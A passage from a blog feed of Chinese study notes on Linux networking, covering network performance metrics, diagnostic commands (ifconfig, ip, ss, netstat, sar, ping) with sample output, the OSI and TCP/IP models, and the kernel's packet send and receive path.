title="性能指标"></a>性能指标</h2><p>实际上，我们通常用带宽、吞吐量、延时、PPS（Packet Per Second）等指标衡量网络的性能。</p><ul><li><p><strong>带宽</strong>，表示链路的最大传输速率，单位通常为 b&#x2F;s （比特&#x2F;秒）。</p></li><li><p><strong>吞吐量</strong>，表示单位时间内成功传输的数据量，单位通常为 b&#x2F;s（比特&#x2F;秒）或者 B&#x2F;s（字节&#x2F;秒）。吞吐量受带宽限制，而吞吐量&#x2F;带宽，也就是该网络的使用率。</p></li><li><p><strong>延时</strong>，表示从网络请求发出后，一直到收到远端响应，所需要的时间延迟。在不同场景中，这一指标可能会有不同含义。比如，它可以表示，建立连接需要的时间（比如 TCP 握手延时），或一个数据包往返所需的时间（比如 RTT）。</p></li><li><p><strong>PPS</strong>，是 Packet Per Second（包&#x2F;秒）的缩写，表示以网络包为单位的传输速率。PPS 通常用来评估网络的转发能力，比如硬件交换机，通常可以达到线性转发（即 PPS 可以达到或者接近理论最大值）。而基于 Linux 服务器的转发，则容易受网络包大小的影响。</p></li></ul><p>除了这些指标， <strong>网络的可用性</strong>（网络能否正常通信）、 <strong>并发连接数</strong>（TCP连接数量）、 <strong>丢包率</strong>（丢包百分比）、 <strong>重传率</strong>（重新传输的网络包比例）等也是常用的性能指标。</p><p>接下来，打开一个终端，SSH登录到服务器上，然后一起来探索这些性能指标。</p><h2 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a><strong>网络配置</strong></h2><p>分析网络问题的第一步，通常是查看网络接口的配置和状态。可以使用 ifconfig 或者 ip 命令，来查看网络的配置。更推荐使用 ip 工具，因为它提供了更丰富的功能和更易用的接口。</p><blockquote><p>ifconfig 和 ip 分别属于软件包 net-tools 和 iproute2，iproute2 是 net-tools 的下一代。通常情况下它们会在发行版中默认安装。但如果你找不到 ifconfig 或者 ip 命令，可以安装这两个软件包。</p></blockquote><p>以网络接口 eth0 为例，你可以运行下面的两个命令，查看它的配置和状态：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs tap">$ ifconfig eth0<br>eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500<br>      inet 10.240.0.30 netmask 255.240.0.0 broadcast 10.255.255.255<br>      inet6 fe80::20d:3aff:fe07:cf2a prefixlen<span class="hljs-number"> 64 </span>scopeid 0x20&lt;link&gt;<br>      ether 78:0d:3a:07:cf:3a txqueuelen<span class="hljs-number"> 1000 </span>(Ethernet)<br>      RX packets<span class="hljs-number"> 40809142 </span>bytes<span class="hljs-number"> 9542369803 </span>(9.5 GB)<br>      RX errors<span class="hljs-number"> 0 </span>dropped<span class="hljs-number"> 0 </span>overruns<span class="hljs-number"> 0 </span>frame 0<br>      TX packets<span class="hljs-number"> 32637401 </span>bytes<span class="hljs-number"> 4815573306 </span>(4.8 GB)<br>      TX errors<span class="hljs-number"> 0 </span>dropped<span class="hljs-number"> 0 </span>overruns<span class="hljs-number"> 0 </span>carrier<span class="hljs-number"> 0 </span>collisions 0<br>​<br>$ ip -s addr show dev eth0<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu<span class="hljs-number"> 1500 </span>qdisc mq state UP group default qlen 1000<br>  link/ether 78:0d:3a:07:cf:3a brd ff:ff:ff:ff:ff:ff<br>  inet 10.240.0.30/12 brd 10.255.255.255 scope global eth0<br>      valid_lft forever preferred_lft forever<br>  inet6 fe80::20d:3aff:fe07:cf2a/64 scope link<br>      valid_lft forever preferred_lft forever<br>  RX: bytes packets errors dropped overrun mcast<br>  <span class="hljs-number"> 9542432350 </span>40809397<span class="hljs-number"> 0 </span>     <span class="hljs-number"> 0 </span>     <span class="hljs-number"> 0 </span>      193<br>  TX: bytes packets errors dropped carrier collsns<br>  <span class="hljs-number"> 4815625265 </span>32637658<span class="hljs-number"> 0 </span>     <span class="hljs-number"> 0 </span>     <span class="hljs-number"> 0 </span>      0<br><br></code></pre></td></tr></table></figure><p>可以看到，ifconfig 和 ip 命令输出的指标基本相同，只是显示格式略微不同。比如，它们都包括了网络接口的状态标志、MTU 大小、IP、子网、MAC 地址以及网络包收发的统计信息。</p><p>这些具体指标的含义，在文档中都有详细的说明，不过，这里有几个跟网络性能密切相关的指标，需要特别关注一下。</p><p>第一，网络接口的状态标志。ifconfig 输出中的 RUNNING ，或 ip 输出中的 LOWER_UP ，都表示物理网络是连通的，即网卡已经连接到了交换机或者路由器中。如果你看不到它们，通常表示网线被拔掉了。</p><p>第二，MTU 的大小。MTU 默认大小是 1500，根据网络架构的不同（比如是否使用了 VXLAN 等叠加网络），你可能需要调大或者调小 MTU 的数值。</p><p>第三，网络接口的 IP 地址、子网以及 MAC 地址。这些都是保障网络功能正常工作所必需的，你需要确保配置正确。</p><p>第四，网络收发的字节数、包数、错误数以及丢包情况，特别是 TX 和 RX 部分的 errors、dropped、overruns、carrier 以及 collisions 等指标不为 0 时，通常表示出现了网络 I&#x2F;O 问题。其中：</p><ul><li><p>errors 表示发生错误的数据包数，比如校验错误、帧同步错误等；</p></li><li><p>dropped 表示丢弃的数据包数，即数据包已经收到了 Ring Buffer，但因为内存不足等原因丢包；</p></li><li><p>overruns 表示超限数据包数，即网络 I&#x2F;O 速度过快，导致 Ring Buffer 中的数据包来不及处理（队列满）而导致的丢包；</p></li><li><p>carrier 表示发生 carrirer 错误的数据包数，比如双工模式不匹配、物理电缆出现问题等；</p></li><li><p>collisions 表示碰撞数据包数。</p></li></ul><h2 id="套接字信息"><a href="#套接字信息" class="headerlink" title="套接字信息"></a><strong>套接字信息</strong></h2><p>ifconfig 和 ip 只显示了网络接口收发数据包的统计信息，但在实际的性能问题中，网络协议栈中的统计信息，我们也必须关注。可以用 netstat 或者 ss 来查看套接字、网络栈、网络接口以及路由表的信息。</p><p>更推荐使用 ss 来查询网络的连接信息，因为它比 netstat 提供了更好的性能（速度更快）。</p><p>比如，执行下面的命令，查询套接字信息：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># head -n 3 表示只显示前面3行</span><br><span class="hljs-comment"># -l 表示只显示监听套接字</span><br><span class="hljs-comment"># -n 表示显示数字地址和端口(而不是名字)</span><br><span class="hljs-comment"># -p 表示显示进程信息</span><br>$ netstat -nlp | head -n 3<br>Active Internet connections (only servers)<br>Proto Recv-Q Send-Q Local<span class="hljs-built_in"> Address </span>          Foreign<span class="hljs-built_in"> Address </span>        State       PID/Program name<br>tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      840/systemd-resolve<br><br><span class="hljs-comment"># -l 表示只显示监听套接字</span><br><span class="hljs-comment"># -t 表示只显示 TCP 套接字</span><br><span class="hljs-comment"># -n 表示显示数字地址和端口(而不是名字)</span><br><span class="hljs-comment"># -p 表示显示进程信息</span><br>$ ss -ltnp | head -n 3<br>State    Recv-Q    Send-Q        Local Address:Port       <span class="hljs-built_in"> Peer </span>Address:Port<br>LISTEN   0         128           127.0.0.53%lo:53               0.0.0.0:*        users:((<span class="hljs-string">&quot;systemd-resolve&quot;</span>,<span class="hljs-attribute">pid</span>=840,fd=13))<br>LISTEN   0         128                 0.0.0.0:22               0.0.0.0:*        users:((<span class="hljs-string">&quot;sshd&quot;</span>,<span class="hljs-attribute">pid</span>=1459,fd=3))<br><br></code></pre></td></tr></table></figure><p>netstat 和 ss 的输出也是类似的，都展示了套接字的状态、接收队列、发送队列、本地地址、远端地址、进程 PID 和进程名称等。</p><p>其中，接收队列（Recv-Q）和发送队列（Send-Q）需要你特别关注，它们通常应该是 0。当你发现它们不是 0 时，说明有网络包的堆积发生。当然还要注意，在不同套接字状态下，它们的含义不同。</p><p>当套接字处于连接状态（Established）时，</p><ul><li><p>Recv-Q 表示套接字缓冲还没有被应用程序取走的字节数（即接收队列长度）。</p></li><li><p>而 Send-Q 表示还没有被远端主机确认的字节数（即发送队列长度）。</p></li></ul><p>当套接字处于监听状态（Listening）时，</p><ul><li><p>Recv-Q 表示全连接队列的长度。</p></li><li><p>而 Send-Q 表示全连接队列的最大长度。</p></li></ul><p>所谓全连接，是指服务器收到了客户端的 ACK，完成了 TCP 三次握手，然后就会把这个连接挪到全连接队列中。这些全连接中的套接字，还需要被 accept() 系统调用取走，服务器才可以开始真正处理客户端的请求。</p><p>与全连接队列相对应的，还有一个半连接队列。所谓半连接是指还没有完成 TCP 三次握手的连接，连接只进行了一半。服务器收到了客户端的 SYN 包后，就会把这个连接放到半连接队列中，然后再向客户端发送 SYN+ACK 包。</p><h2 id="协议栈统计信息"><a href="#协议栈统计信息" class="headerlink" title="协议栈统计信息"></a><strong>协议栈统计信息</strong></h2><p>类似的，使用 netstat 或 ss ，也可以查看协议栈的信息：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs tap">$ netstat -s<br>...<br>Tcp:<br>   <span class="hljs-number"> 3244906 </span>active connection openings<br>   <span class="hljs-number"> 23143 </span>passive connection openings<br>   <span class="hljs-number"> 115732 </span>failed connection attempts<br>   <span class="hljs-number"> 2964 </span>connection resets received<br>   <span class="hljs-number"> 1 </span>connections established<br>   <span class="hljs-number"> 13025010 </span>segments received<br>   <span class="hljs-number"> 17606946 </span>segments sent out<br>   <span class="hljs-number"> 44438 </span>segments retransmitted<br>   <span class="hljs-number"> 42 </span>bad segments received<br>   <span class="hljs-number"> 5315 </span>resets sent<br>    InCsumErrors: 42<br>...<br><br>$ ss -s<br>Total:<span class="hljs-number"> 186 </span>(kernel 1446)<br>TCP:  <span class="hljs-number"> 4 </span>(estab 1, closed 0, orphaned 0, synrecv 0, timewait 0/0), ports 0<br><br>Transport Total     IP        IPv6<br>* <span class="hljs-number"> 1446 </span>     -         -<br>RAW <span class="hljs-number"> 2 </span>       <span class="hljs-number"> 1 </span>        1<br>UDP <span class="hljs-number"> 2 </span>       <span class="hljs-number"> 2 </span>        0<br>TCP <span class="hljs-number"> 4 </span>       <span class="hljs-number"> 3 </span>        1<br>...<br><br></code></pre></td></tr></table></figure><p>这些协议栈的统计信息都很直观。ss 只显示已经连接、关闭、孤儿套接字等简要统计，而netstat 则提供的是更详细的网络协议栈信息。</p><p>比如，上面 netstat 的输出示例，就展示了 TCP 协议的主动连接、被动连接、失败重试、发送和接收的分段数量等各种信息。</p><h2 id="网络吞吐和-PPS"><a href="#网络吞吐和-PPS" class="headerlink" title="网络吞吐和 PPS"></a><strong>网络吞吐和 PPS</strong></h2><p>接下来再来看看如何查看系统当前的网络吞吐量和 PPS。推荐使用 sar，它同时支持排查 CPU、内存和 I&#x2F;O 。</p><p>给 sar 增加 -n 参数就可以查看网络的统计信息，比如网络接口（DEV）、网络接口错误（EDEV）、TCP、UDP、ICMP 等等。执行下面的命令，你就可以得到网络接口统计信息：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 数字1表示每隔1秒输出一组数据</span><br>$ sar -n DEV <span class="hljs-number">1</span><br>Linux <span class="hljs-number">4.15</span>.<span class="hljs-number">0</span>-<span class="hljs-number">1035</span> (ubuntu) <span class="hljs-number">01</span><span class="hljs-regexp">/06/</span><span class="hljs-number">19</span> _x86_64_(<span class="hljs-number">2</span> CPU)<br><br><span class="hljs-number">13</span>:<span class="hljs-number">21</span>:<span class="hljs-number">40</span>        IFACE   rxpck<span class="hljs-regexp">/s   txpck/</span>s    rxkB<span class="hljs-regexp">/s    txkB/</span>s   rxcmp<span class="hljs-regexp">/s   txcmp/</span>s  rxmcst/s   %ifutil<br><span class="hljs-number">13</span>:<span class="hljs-number">21</span>:<span class="hljs-number">41</span>         eth0     <span class="hljs-number">18.00</span>     <span class="hljs-number">20.00</span>      <span class="hljs-number">5.79</span>      <span class="hljs-number">4.25</span>      <span class="hljs-number">0.00</span>      <span class="hljs-number">0.00</span>      <span class="hljs-number">0.00</span>      <span class="hljs-number">0.00</span><br><span class="hljs-number">13</span>:<span class="hljs-number">21</span>:<span class="hljs-number">41</span>      docker0      <span class="hljs-number">0.00</span>      <span class="hljs-number">0.00</span>      <span class="hljs-number">0.00</span>      <span class="hljs-number">0.00</span>      <span class="hljs-number">0.00</span>      <span class="hljs-number">0.00</span>      <span class="hljs-number">0.00</span>      <span class="hljs-number">0.00</span><br><span class="hljs-number">13</span>:<span class="hljs-number">21</span>:<span class="hljs-number">41</span>           lo      <span class="hljs-number">0.00</span>      <span class="hljs-number">0.00</span>      <span class="hljs-number">0.00</span>      <span class="hljs-number">0.00</span>      <span class="hljs-number">0.00</span>      <span class="hljs-number">0.00</span>      <span class="hljs-number">0.00</span>      <span class="hljs-number">0.00</span><br><br></code></pre></td></tr></table></figure><p>这儿输出的指标比较多，我来简单解释下它们的含义。</p><ul><li><p>rxpck&#x2F;s 和 txpck&#x2F;s 分别是接收和发送的 PPS，单位为包&#x2F;秒。</p></li><li><p>rxkB&#x2F;s 和 txkB&#x2F;s 分别是接收和发送的吞吐量，单位是KB&#x2F;秒。</p></li><li><p>rxcmp&#x2F;s 和 txcmp&#x2F;s 分别是接收和发送的压缩数据包数，单位是包&#x2F;秒。</p></li><li><p>%ifutil 是网络接口的使用率，即半双工模式下为 (rxkB&#x2F;s+txkB&#x2F;s)&#x2F;Bandwidth，而全双工模式下为 max(rxkB&#x2F;s, txkB&#x2F;s)&#x2F;Bandwidth。</p></li></ul><p>其中，Bandwidth 可以用 ethtool 来查询，它的单位通常是 Gb&#x2F;s 或者 Mb&#x2F;s，不过注意这里小写字母 b ，表示比特而不是字节。我们通常提到的千兆网卡、万兆网卡等，单位也都是比特。如下为千兆网卡：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c">$ ethtool eth0 <span class="hljs-string">| grep Speed</span><br>Speed: <span class="hljs-number">1000</span>Mb/s<br><br></code></pre></td></tr></table></figure><h2 id="连通性和延时"><a href="#连通性和延时" class="headerlink" title="连通性和延时"></a><strong>连通性和延时</strong></h2><p>最后，通常使用 ping ，来测试远程主机的连通性和延时，而这基于 ICMP 协议。比如，执行下面的命令，就可以测试本机到 114.114.114.114 这个 IP 地址的连通性和延时：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># -c3表示发送三次ICMP包后停止</span><br>$<span class="hljs-built_in"> ping </span>-c3 114.114.114.114<span class="hljs-built_in"></span><br><span class="hljs-built_in">PING </span>114.114.114.114 (114.114.114.114) 56(84) bytes of data.<br>64 bytes <span class="hljs-keyword">from</span> 114.114.114.114: <span class="hljs-attribute">icmp_seq</span>=1 <span class="hljs-attribute">ttl</span>=54 <span class="hljs-attribute">time</span>=244 ms<br>64 bytes <span class="hljs-keyword">from</span> 114.114.114.114: <span class="hljs-attribute">icmp_seq</span>=2 <span class="hljs-attribute">ttl</span>=47 <span class="hljs-attribute">time</span>=244 ms<br>64 bytes <span class="hljs-keyword">from</span> 114.114.114.114: <span class="hljs-attribute">icmp_seq</span>=3 <span class="hljs-attribute">ttl</span>=67 <span class="hljs-attribute">time</span>=244 ms<br><br>--- 114.114.114.114<span class="hljs-built_in"> ping </span>statistics ---<br>3 packets transmitted, 3 received, 0% packet loss, time 2001ms<br>rtt min/avg/max/mdev = 244.023/244.070/244.105/0.034 ms<br><br></code></pre></td></tr></table></figure><p>ping 的输出，可以分为两部分。</p><ul><li><p>第一部分，是每个 ICMP 请求的信息，包括 ICMP 序列号（icmp_seq）、TTL（生存时间，或者跳数）以及往返延时。</p></li><li><p>第二部分，则是三次 ICMP 请求的汇总。</p></li></ul><p>比如上面的示例显示，发送了 3 个网络包，并且接收到 3 个响应，没有丢包发生，这说明测试主机到 114.114.114.114 是连通的；平均往返延时（RTT）是 244ms，也就是从发送 ICMP 开始，到接收到 114.114.114.114 回复的确认，总共经历 244ms。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>我们通常使用带宽、吞吐量、延时等指标，来衡量网络的性能；相应的，可以用 ifconfig、netstat、ss、sar、ping 等工具，来查看这些网络的性能指标。</p><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>你理解的 Linux 网络性能。常用什么指标来衡量网络的性能？又用什么思路分析相应性能问题呢？</p><ul><li>iperf、iperf3:测试带宽，传输量；</li><li>netperf：根据应用的不同，可以进行不同模式的网络性能测试，即批量数据传输（bulk data transfer）模式和请求 &#x2F; 应答（request&#x2F;reponse）模式。</li><li>mtr、ping、hping3 : 测试时延</li><li>pktgen：pps、吞吐量</li><li>ab、webbench ： HTTP 压力测试工具</li><li>wrk、TCPCopy、Jmeter 或者 LoadRunner ：模拟用户实际请求</li></ul><p><img src="https://static001.geekbang.org/resource/image/a1/3b/a1eb07e281e5795be83c11d7255c543b.png?wh=1714*1944" alt="img"></p><p><img src="https://static001.geekbang.org/resource/image/0d/a0/0d87b39b89a1b7f325fc5477c0182ea0.png?wh=1714*2280" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>笔记</tag>
      
      <tag>linux</tag>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>1.关于 Linux 网络基础-网络模型与网络栈</title>
    <link href="/2022/11/06/1.%E5%85%B3%E4%BA%8E%20Linux%20%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%8A%EF%BC%89/"/>
    <url>/2022/11/06/1.%E5%85%B3%E4%BA%8E%20Linux%20%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%8A%EF%BC%89/</url>
    
    <content type="html"><![CDATA[ <meta name="referrer" content="no-referrer"># 1.关于 Linux 网络基础-网络模型与网络栈<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">&gt; 本文笔记来自：「极客时间  Linux 性能优化实战」，原文链接：https:<span class="hljs-regexp">//</span>time.geekbang.org<span class="hljs-regexp">/column/</span>article/<span class="hljs-number">80898</span><br></code></pre></td></tr></table></figure><p>Linux 网络怎么工作的呢？又有哪些指标衡量网络的性能呢？接下来的两篇文章，一起学习 Linux 网络的工作原理和性能指标。</p><h2 id="网络模型"><a href="#网络模型" class="headerlink" title="网络模型"></a>网络模型</h2><p>说到网络，你肯定经常提起七层负载均衡、四层负载均衡，或者三层设备、二层设备等等。那么，这里说的二层、三层、四层、七层又都是什么意思呢？</p><p>实际上，这些层都来自国际标准化组织制定的 <strong>开放式系统互联通信参考模型</strong>（Open System Interconnection Reference Model），简称为 OSI 网络模型。</p><p>为了解决网络互联中异构设备的兼容性问题，并解耦复杂的网络包处理流程，OSI 模型把网络互联的框架分为应用层、表示层、会话层、传输层、网络层、数据链路层以及物理层等七层，每个层负责不同的功能。其中，</p><ul><li><p>应用层，负责为应用程序提供统一的接口。</p></li><li><p>表示层，负责把数据转换成兼容接收系统的格式。</p></li><li><p>会话层，负责维护计算机之间的通信连接。</p></li><li><p>传输层，负责为数据加上传输表头，形成数据包。</p></li><li><p>网络层，负责数据的路由和转发。</p></li><li><p>数据链路层，负责MAC寻址、错误侦测和改错。</p></li><li><p>物理层，负责在物理网络中传输数据帧。</p></li></ul><p>但是 OSI 模型还是太复杂了，也没能提供一个可实现的方法。所以，在 Linux 中，我们实际上使用的是另一个更实用的四层模型，即 TCP&#x2F;IP 网络模型。</p><p>TCP&#x2F;IP 模型，把网络互联的框架分为应用层、传输层、网络层、网络接口层等四层，其中，</p><ul><li><p>应用层，负责向用户提供一组应用程序，比如 HTTP、FTP、DNS 等。</p></li><li><p>传输层，负责端到端的通信，比如 TCP、UDP 等。</p></li><li><p>网络层，负责网络包的封装、寻址和路由，比如 IP、ICMP 等。</p></li><li><p>网络接口层，负责网络包在物理网络中的传输，比如 MAC 寻址、错误侦测以及通过网卡传输网络帧等。</p></li></ul><p>TCP&#x2F;IP 与 OSI 模型的关系如下所示：</p><p><img src="https://static001.geekbang.org/resource/image/f2/bd/f2dbfb5500c2aa7c47de6216ee7098bd.png?wh=591*521" alt="img"></p><p>当然了，虽说 Linux 实际按照 TCP&#x2F;IP 模型，实现了网络协议栈，但在平时的学习交流中，我们习惯上还是用 OSI 七层模型来描述。比如，说到七层和四层负载均衡，对应的分别是 OSI 模型中的应用层和传输层（而它们对应到 TCP&#x2F;IP 模型中，实际上是四层和三层）。</p><p>TCP&#x2F;IP 模型包括了大量的网络协议，这些协议的原理以及核心基础知识。可以通过<strong>《TCP&#x2F;IP 详解》</strong>的卷一和卷二进行学习。</p><h2 id="Linux网络栈"><a href="#Linux网络栈" class="headerlink" title="Linux网络栈"></a>Linux网络栈</h2><p>有了 TCP&#x2F;IP 模型后，在进行网络传输时，数据包就会按照协议栈，对上一层发来的数据进行逐层处理；然后封装上该层的协议头，再发送给下一层。</p><p>当然，网络包在每一层的处理逻辑，都取决于各层采用的网络协议。比如在应用层，一个提供 REST API 的应用，可以使用 HTTP 协议，把它需要传输的 JSON 数据封装到 HTTP 协议中，然后向下传递给 TCP 层。</p><p>而封装做的事情就很简单了，只是在原来的负载前后，增加固定格式的元数据，原始的负载数据并不会被修改。</p><p>比如，以通过 TCP 协议通信的网络包为例，通过下面这张图，可以看到应用程序数据在每个层的封装格式。</p><p><img src="https://static001.geekbang.org/resource/image/c8/79/c8dfe80acc44ba1aa9df327c54349e79.png?wh=525*254" alt="img"></p><p>其中：</p><ul><li><p>传输层在应用程序数据前面增加了 TCP 头；</p></li><li><p>网络层在 TCP 数据包前增加了 IP 头；</p></li><li><p>而网络接口层，又在 IP 数据包前后分别增加了帧头和帧尾。</p></li></ul><p>这些新增的头部和尾部，都按照特定的协议格式填充，想了解具体格式，可以查看协议的文档。 </p><p>这些新增的头部和尾部，增加了网络包的大小，但我们都知道，物理链路中并不能传输任意大小的数据包。网络接口配置的最大传输单元（MTU），就规定了最大的 IP 包大小。在我们最常用的以太网中，MTU 默认值是 1500（这也是 Linux 的默认值）。</p><p>一旦网络包超过 MTU 的大小，就会在网络层分片，以保证分片后的 IP 包不大于MTU 值。显然，MTU 越大，需要的分包也就越少，自然，网络吞吐能力就越好。</p><p>理解了 TCP&#x2F;IP 网络模型和网络包的封装原理后，Linux 内核中的网络栈，其实也类似于 TCP&#x2F;IP 的四层结构。如下图所示，就是 Linux 通用 IP 网络栈的示意图：</p><p><img src="https://static001.geekbang.org/resource/image/c7/ac/c7b5b16539f90caabb537362ee7c27ac.png?wh=1092*1316" alt="img"></p><p>（图片参考《性能之巅》图 10.7 通用 IP 网络栈绘制）</p><p>我们从上到下来看这个网络栈，可以发现，</p><ul><li><p>最上层的应用程序，需要通过系统调用，来跟套接字接口进行交互；</p></li><li><p>套接字的下面，就是前面提到的传输层、网络层和网络接口层；</p></li><li><p>最底层，则是网卡驱动程序以及物理网卡设备。</p></li></ul><p>网卡作为发送和接收网络包的基本设备。在系统启动过程中，网卡通过内核中的网卡驱动程序注册到系统中。而在网络收发过程中，内核通过中断跟网卡进行交互。</p><p>再结合前面提到的 Linux 网络栈，可以看出，网络包的处理非常复杂。所以，网卡硬中断只处理最核心的网卡数据读取或发送，而协议栈中的大部分逻辑，都会放到软中断中处理。</p><h2 id="Linux网络收发流程"><a href="#Linux网络收发流程" class="headerlink" title="Linux网络收发流程"></a>Linux网络收发流程</h2><p>了解了 Linux 网络栈后，我们再来看看， Linux 到底是怎么收发网络包的。</p><blockquote><p>注意，以下内容都以物理网卡为例。事实上，Linux 还支持众多的虚拟网络设备，而它们的网络收发流程会有一些差别。</p></blockquote><h3 id="网络包的接收流程"><a href="#网络包的接收流程" class="headerlink" title="网络包的接收流程"></a>网络包的接收流程</h3><p>我们先来看网络包的接收流程。</p><p>当一个网络帧到达网卡后，网卡会通过 DMA 方式，把这个网络包放到收包队列中；然后通过硬中断，告诉中断处理程序已经收到了网络包。</p><p>接着，网卡中断处理程序会为网络帧分配内核数据结构（sk_buff），并将其拷贝到 sk_buff 缓冲区中；然后再通过软中断，通知内核收到了新的网络帧。</p><p>接下来，内核协议栈从缓冲区中取出网络帧，并通过网络协议栈，从下到上逐层处理这个网络帧。比如，</p><ul><li><p>在链路层检查报文的合法性，找出上层协议的类型（比如 IPv4 还是 IPv6），再去掉帧头、帧尾，然后交给网络层。</p></li><li><p>网络层取出 IP 头，判断网络包下一步的走向，比如是交给上层处理还是转发。当网络层确认这个包是要发送到本机后，就会取出上层协议的类型（比如 TCP 还是 UDP），去掉 IP 头，再交给传输层处理。</p></li><li><p>传输层取出 TCP 头或者 UDP 头后，根据 &lt;源 IP、源端口、目的 IP、目的端口&gt; 四元组作为标识，找出对应的 Socket，并把数据拷贝到 Socket 的接收缓存中。</p></li></ul><p>最后，应用程序就可以使用 Socket 接口，读取到新接收到的数据了。</p><p>流程图如下所示，这张图的左半部分表示接收流程，而图中的粉色箭头则表示网络包的处理路径。</p><p><img src="https://static001.geekbang.org/resource/image/3a/65/3af644b6d463869ece19786a4634f765.png?wh=1826*1118" alt="img"></p><h3 id="网络包的发送流程"><a href="#网络包的发送流程" class="headerlink" title="网络包的发送流程"></a>网络包的发送流程</h3><p>了解网络包的接收流程后，就很容易理解网络包的发送流程。网络包的发送流程就是上图的右半部分，很容易发现，网络包的发送方向，正好跟接收方向相反。</p><p>首先，应用程序调用 Socket API（比如 sendmsg）发送网络包。</p><p>由于这是一个系统调用，所以会陷入到内核态的套接字层中。套接字层会把数据包放到 Socket 发送缓冲区中。</p><p>接下来，网络协议栈从 Socket 发送缓冲区中，取出数据包；再按照 TCP&#x2F;IP 栈，从上到下逐层处理。比如，传输层和网络层，分别为其增加 TCP 头和 IP 头，执行路由查找确认下一跳的 IP，并按照 MTU 大小进行分片。</p><p>分片后的网络包，再送到网络接口层，进行物理地址寻址，以找到下一跳的 MAC 地址。然后添加帧头和帧尾，放到发包队列中。这一切完成后，会有软中断通知驱动程序：发包队列中有新的网络帧需要发送。</p><p>最后，驱动程序通过 DMA ，从发包队列中读出网络帧，并通过物理网卡把它发送出去。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a><strong>小结</strong></h2><p>这篇文章梳理了 Linux 网络的工作原理。</p><p>多台服务器通过网卡、交换机、路由器等网络设备连接到一起，构成了相互连接的网络。由于网络设备的异构性和网络协议的复杂性，国际标准化组织定义了一个七层的 OSI 网络模型，但是这个模型过于复杂，实际工作中的事实标准，是更为实用的 TCP&#x2F;IP 模型。</p><p>TCP&#x2F;IP 模型，把网络互联的框架，分为应用层、传输层、网络层、网络接口层等四层，这也是 Linux 网络栈最核心的构成部分。</p><ul><li><p>应用程序通过套接字接口发送数据包，先要在网络协议栈中从上到下进行逐层处理，最终再送到网卡发送出去。</p></li><li><p>而接收时，同样先经过网络栈从下到上的逐层处理，最终才会送到应用程序。</p></li></ul><h2 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h2><p>碰到过哪些网络相关的性能瓶颈？又是怎么样来分析它们的呢？</p><p>网络报文传需要在用户态和内核态来回切换，导致性能下降。业界使用零拷贝或intel的dpdk来提高性能。</p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>笔记</tag>
      
      <tag>linux</tag>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux网络报文捕获/抓包技术对比</title>
    <link href="/2022/11/05/Linux%E7%BD%91%E7%BB%9C%E6%8A%A5%E6%96%87%E6%8D%95%E8%8E%B7-%E6%8A%93%E5%8C%85%E6%8A%80%E6%9C%AF%E5%AF%B9%E6%AF%94/"/>
